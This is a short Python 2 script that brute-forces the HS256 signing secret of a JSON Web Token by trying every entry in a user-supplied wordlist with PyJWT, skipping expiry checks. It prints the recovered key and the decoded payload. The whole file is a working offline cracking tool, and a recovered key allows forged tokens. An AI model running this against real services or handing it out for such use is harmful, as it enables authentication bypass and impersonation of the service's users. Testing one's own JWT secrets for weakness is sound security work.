import jwt;

token = raw_input("Enter JWT token:")
files = raw_input("Enter wordlist name:")

# change this to True to verify token expiration
options = { 'verify_exp':False}

with open(files) as seckeys:
	for secret in seckeys:
		try:
			# change algorithm='HS256' to another supported algorithm if necessary
			# refer to https://pypi.python.org/pypi/PyJWT/1.0.1 for algorithm support
			payload = jwt.decode(token, secret.rstrip(), algorithm='HS256', options=options)
			print "Success. Token decoded with the following key:" + secret.rstrip()
			print payload
			break
		except jwt.InvalidTokenError:
			print "Failed to verify token signature with the following key: "  + secret.rstrip()
		except jwt.ExpiredSignatureError:
			print "Token is Expired"
